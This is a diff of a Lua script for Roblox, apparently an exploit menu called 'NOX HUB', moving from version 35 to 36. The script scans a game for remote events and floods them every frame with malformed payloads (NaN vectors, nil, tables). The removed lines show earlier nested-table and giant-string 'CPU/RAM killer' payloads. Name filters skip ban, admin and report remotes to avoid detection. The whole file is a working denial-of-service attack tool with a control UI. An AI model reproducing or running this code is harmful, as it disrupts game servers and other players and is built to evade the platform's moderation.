@@ -1,12 +1,12 @@
 --[[
-    🔱 NOX HUB v35.0 [SUPERNOVA] 🔱
-    "Brighter than a thousand suns. The ultimate overload."
+    🔱 NOX HUB v36.0 [APOCALYPSE-NOW] 🔱
+    "No more hiding. Total saturation."
     
-    SUPERNOVA FEATURES:
-    - [ASYNC BOMBARDMENT] : Uses 'FireServer' to prevent client lag. Zero waiting.
-    - [HYBRID PAYLOAD] : Alternates between Deep Tables (CPU Kill) and Heavy Strings (RAM Kill).
-    - [MULTI-THREADED] : Dedicates a separate attack thread to EVERY remote found.
-    - [SAFETY SHIELD] : Active protection against HoneyPots (DevTools, Market).
+    APOCALYPSE FEATURES:
+    - [RELIABILITY FIX] : Simplified engine loop to ensure execution.
+    - [CONSOLE LOGS] : Prints DEBUG info (F9) to confirm activity.
+    - [TRINITY PAYLOAD] : Rotates between NaN, Nil, and Empty Table per frame.
+    - [GLOBAL SCAN] : Aggressive scanner for ReplicatedStorage/Workspace/Players.
 ]]
 
 -- // CORE SERVICES //
@@ -16,98 +16,113 @@ local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
--- // 1. SUPERNOVA ENGINE //
+-- // 1. APOCALYPSE ENGINE //
 local Engine = {
     Active = false,
     Targets = {},
     Buffer = {} 
 }
 
+function Engine:Log(msg)
+    warn("[NOX]: " .. tostring(msg))
+end
+
 function Engine:Scan()
+    Engine.Log("Scanning world...")
     Engine.Targets = {}
-    for _, v in pairs(game:GetDescendants()) do
+    local count = 0
+    
+    local function check(v)
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
             local n = v.Name:lower()
-            -- THE SHIELD (Critical for survival)
+            -- Standard Safelist
             if not (n:find("ban") or n:find("kick") or n:find("admin") or 
                     n:find("market") or n:find("purchase") or n:find("shop") or 
                     n:find("product") or n:find("asset") or n:find("prompt") or
                     n:find("devtools") or n:find("console") or n:find("debug") or
                     n:find("warn") or n:find("error") or n:find("report")) then
                  table.insert(Engine.Targets, v)
+                 count = count + 1
             end
         end
     end
+
+    for _, v in pairs(game:GetDescendants()) do check(v) end
+    
+    Engine.Log("Scan complete. Targets found: " .. count)
+    return count
 end
 
-function Engine:Supernova(duration, updateCallback)
-    if Engine.Active then return end
+function Engine:Apocalypse(duration, updateCallback)
+    if Engine.Active then 
+        Engine.Log("Already active!")
+        return 
+    end
     Engine.Active = true
+    Engine.Log("Initiating Apocalypse Protocol...")
     
-    Engine:Scan()
+    local count = Engine:Scan()
     
-    if #Engine.Targets == 0 then
-        updateCallback(0, "NO SAFE TARGETS.")
+    if count == 0 then
+        updateCallback(0, "NO TARGETS FOUND (CHECK CONSOLE)")
+        Engine.Log("FAILURE: 0 Targets found.")
         Engine.Active = false
         return
     end
     
-    -- PAYLOAD 1: DEEP NEST (CPU KILLER)
-    local RemoteBomb = {}
-    local Current = RemoteBomb
-    for i = 1, 90 do Current[1] = {}; Current = Current[1] end
-    
-    -- PAYLOAD 2: HEAVY STRING (RAM KILLER) - Smaller than v33 to avoid Bandwidth Ban
-    local RamBomb = table.create(500, string.rep("🔥", 100))
+    -- PAYLOADS
+    local NaN = Vector3.new(0/0, 0/0, 0/0)
+    local PayloadNaN = {NaN, NaN, NaN}
+    local PayloadTable = table.create(100, {})
+    local PayloadNil = nil
     
     task.spawn(function()
         local StartTime = tick()
         local EndTime = StartTime + duration
         
-        -- PHASE 1: THE GATLING GUN
-        -- We spawn a SEPARATE thread for EACH Target.
-        -- This ensures we hit every vulnerability simultaneously.
-        
-        local Threads = {}
-        
-        for _, remote in pairs(Engine.Targets) do
-            local t = task.spawn(function()
-                while Engine.Active and tick() < EndTime do
-                    -- High Speed Loop
-                    -- We alternate payloads to confuse the parser
-                    pcall(function()
-                        -- FIRE 1 (CPU)
-                        if remote:IsA("RemoteEvent") then remote:FireServer(RemoteBomb)
-                        else task.spawn(function() remote:InvokeServer(RemoteBomb) end) end
-                    end)
+        -- MAIN LOOP (Heartbeat)
+        -- We process ALL targets every frame.
+        local Connection
+        Connection = RunService.Heartbeat:Connect(function()
+            if not Engine.Active or tick() >= EndTime then
+                Connection:Disconnect()
+                return
+            end
+            
+            -- GATLING FIRE
+            -- We iterate all targets and fire 1 shot per frame per target
+            for _, r in pairs(Engine.Targets) do
+                pcall(function()
+                    -- Rotate Attack
+                    local mode = math.random(1, 3)
+                    local p = PayloadNil
+                    if mode == 2 then p = PayloadNaN end
+                    if mode == 3 then p = PayloadTable end
                     
-                    pcall(function()
-                        -- FIRE 2 (RAM)
-                        if remote:IsA("RemoteEvent") then remote:FireServer(RamBomb)
-                        else task.spawn(function() remote:InvokeServer(RamBomb) end) end
-                    end)
-                    
-                    -- Micro-Sleep prevents Client Lag (User requested no lag)
-                    -- But we keep it extremely fast.
-                    RunService.Heartbeat:Wait()
-                end
-            end)
-            table.insert(Threads, t)
-        end
+                    if r:IsA("RemoteEvent") then
+                        r:FireServer(p)
+                    elseif r:IsA("RemoteFunction") then
+                        task.spawn(function() r:InvokeServer(p) end)
+                    end
+                end)
+            end
+        end)
         
-        -- MONITORING LOOP
-        while tick() < EndTime do
+        -- UI UPDATE LOOP
+        while tick() < EndTime and Engine.Active do
             local remaining = math.ceil(EndTime - tick())
-            updateCallback(remaining, "SUPERNOVA BURNING... ["..#Engine.Targets.." VECTORS]")
+            updateCallback(remaining, "RAINING FIRE... ["..count.." TARGETS]")
             wait(1)
         end
         
+        if Connection then Connection:Disconnect() end
         Engine.Active = false
+        Engine.Log("Apocalypse finished.")
         updateCallback(duration, "SYSTEM COOLDOWN")
     end)
 end
 
--- // 2. COMMAND CENTER UI (Supernova Theme) //
+-- // 2. COMMAND CENTER UI (Apocalypse Theme) //
 local Nox = {}
 
 function Nox:CreateUI()
@@ -121,29 +136,23 @@ function Nox:CreateUI()
     local Main = Instance.new("Frame", Screen)
     Main.Size = UDim2.new(0, 500, 0, 350)
     Main.Position = UDim2.new(0.5, -250, 0.5, -175)
-    Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Blinding White
-    Main.BorderSizePixel = 0
+    Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Metal Grey
+    Main.BorderSizePixel = 2
+    Main.BorderColor3 = Color3.fromRGB(150, 0, 0)
     Main.ClipsDescendants = true
     
     local Corner = Instance.new("UICorner", Main)
-    Corner.CornerRadius = UDim.new(0, 10)
-    
-    local Gradient = Instance.new("UIGradient", Main)
-    Gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 240, 200)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 200, 100))
-    }
-    Gradient.Rotation = 45
+    Corner.CornerRadius = UDim.new(0, 4)
     
     local TopBar = Instance.new("Frame", Main)
     TopBar.Size = UDim2.new(1, 0, 0, 40)
-    TopBar.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+    TopBar.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
     
     local Title = Instance.new("TextLabel", TopBar)
-    Title.Text = "NOX SUPERNOVA v35.0"
-    Title.Font = Enum.Font.GothamBlack
-    Title.TextColor3 = Color3.fromRGB(255, 255, 255) 
-    Title.TextSize = 16
+    Title.Text = "NOX APOCALYPSE v36.0"
+    Title.Font = Enum.Font.SciFi
+    Title.TextColor3 = Color3.fromRGB(255, 50, 50) 
+    Title.TextSize = 18
     Title.Size = UDim2.new(0.5, 0, 1, 0)
     Title.Position = UDim2.new(0.05, 0, 0, 0)
     Title.TextXAlignment = Enum.TextXAlignment.Left
@@ -153,8 +162,7 @@ function Nox:CreateUI()
     local Tabs = Instance.new("Frame", Main)
     Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) 
     Tabs.Position = UDim2.new(0, 0, 0.15, 0)
-    Tabs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    Tabs.BackgroundTransparency = 0.5
+    Tabs.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
     Tabs.BorderSizePixel = 0
     
     local function CreateTabBtn(text, order, callback)
@@ -162,15 +170,15 @@ function Nox:CreateUI()
         btn.Size = UDim2.new(1, 0, 0, 40)
         btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
         btn.Text = text
-        btn.TextColor3 = Color3.fromRGB(150, 100, 0)
-        btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        btn.Font = Enum.Font.GothamBold
+        btn.TextColor3 = Color3.fromRGB(100, 100, 100)
+        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        btn.Font = Enum.Font.SciFi
         btn.BorderSizePixel = 0
         
         btn.MouseButton1Click:Connect(function()
-            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(150, 100, 0) c.BackgroundColor3 = Color3.fromRGB(255, 255, 255) end end
-            btn.TextColor3 = Color3.fromRGB(255, 50, 0) 
-            btn.BackgroundColor3 = Color3.fromRGB(255, 240, 200)
+            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(100, 100, 100) c.BackgroundColor3 = Color3.fromRGB(20, 20, 20) end end
+            btn.TextColor3 = Color3.fromRGB(255, 0, 0) 
+            btn.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
             callback()
         end)
         return btn
@@ -188,46 +196,52 @@ function Nox:CreateUI()
     PageAttack.BackgroundTransparency = 1
     
     local StatusLbl = Instance.new("TextLabel", PageAttack)
-    StatusLbl.Text = "READY TO IGNITE"
+    StatusLbl.Text = "TARGET ACQUIRED"
     StatusLbl.Size = UDim2.new(1, 0, 0, 30)
     StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
-    StatusLbl.TextColor3 = Color3.fromRGB(255, 100, 0)
-    StatusLbl.Font = Enum.Font.GothamBlack
+    StatusLbl.TextColor3 = Color3.fromRGB(200, 200, 200)
+    StatusLbl.Font = Enum.Font.SciFi
     StatusLbl.BackgroundTransparency = 1
     
     local BufferBarBg = Instance.new("Frame", PageAttack)
     BufferBarBg.Size = UDim2.new(0.8, 0, 0.05, 0)
     BufferBarBg.Position = UDim2.new(0.1, 0, 0.3, 0)
-    BufferBarBg.BackgroundColor3 = Color3.fromRGB(255, 200, 150)
+    BufferBarBg.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
     
     local BufferBarFill = Instance.new("Frame", BufferBarBg)
     BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
-    BufferBarFill.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+    BufferBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
     
     local MainBtn = Instance.new("TextButton", PageAttack)
     MainBtn.Size = UDim2.new(0.6, 0, 0.2, 0)
     MainBtn.Position = UDim2.new(0.2, 0, 0.6, 0)
-    MainBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
-    MainBtn.Text = "DETONATE (15s)"
+    MainBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+    MainBtn.Text = "START APOCALYPSE (15s)"
     MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    MainBtn.Font = Enum.Font.GothamBlack
+    MainBtn.Font = Enum.Font.SciFi
+    MainBtn.TextSize = 16
     local BtnCorner = Instance.new("UICorner", MainBtn)
-    BtnCorner.CornerRadius = UDim.new(0, 6)
+    BtnCorner.CornerRadius = UDim.new(0, 4)
+    local BtnStroke = Instance.new("UIStroke", MainBtn)
+    BtnStroke.Color = Color3.fromRGB(255, 0, 0)
     
     MainBtn.MouseButton1Click:Connect(function()
+        Engine.Log("Button Clicked!")
         if not Engine.Active then
-            Engine:Supernova(15, function(timeLeft, txt)
+            Engine:Apocalypse(15, function(timeLeft, txt)
                 StatusLbl.Text = txt
                 local progress = (15 - timeLeft) / 15
                 BufferBarFill.Size = UDim2.new(progress, 0, 1, 0)
                 
                 if timeLeft == 0 then
-                   MainBtn.Text = "DETONATE (15s)"
+                   MainBtn.Text = "START APOCALYPSE (15s)"
                    BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
                 else
-                   MainBtn.Text = "BURNING... " .. timeLeft
+                   MainBtn.Text = "DESTRUCTION... " .. timeLeft
                 end
             end)
+        else
+            Engine.Log("Ignored click: Engine already active.")
         end
     end)
     
@@ -240,20 +254,20 @@ function Nox:CreateUI()
     local GraphFrame = Instance.new("Frame", PageVisuals)
     GraphFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
     GraphFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
-    GraphFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    GraphFrame.BorderColor3 = Color3.fromRGB(255, 200, 100)
+    GraphFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    GraphFrame.BorderColor3 = Color3.fromRGB(150, 0, 0)
     GraphFrame.BorderSizePixel = 1
     
-    for i = 1, 20 do
+    for i = 1, 40 do
         local bar = Instance.new("Frame", GraphFrame)
-        bar.Size = UDim2.new(0.04, 0, math.random()*0.5, 0)
-        bar.Position = UDim2.new((i-1)*0.05, 0, 1 - bar.Size.Y.Scale, 0)
-        bar.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+        bar.Size = UDim2.new(0.02, 0, math.random()*0.5, 0)
+        bar.Position = UDim2.new((i-1)*0.025, 0, 1 - bar.Size.Y.Scale, 0)
+        bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
         bar.BorderSizePixel = 0
         task.spawn(function()
             while GraphFrame.Parent do
-                local targetHeight = Engine.Active and math.random(0.8, 1) or math.random(0, 0.2)
-                bar:TweenSize(UDim2.new(0.04, 0, targetHeight, 0), "Out", "Quad", 0.1, true)
+                local targetHeight = Engine.Active and math.random(0.5, 1) or math.random(0, 0.1)
+                bar:TweenSize(UDim2.new(0.02, 0, targetHeight, 0), "Out", "Quad", 0.05, true)
                 wait(0.05)
             end
         end)
@@ -277,6 +291,8 @@ function Nox:CreateUI()
         end
     end)
     UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+    
+    Engine.Log("UI Created Successfully.")
 end
 
 Nox:CreateUI()
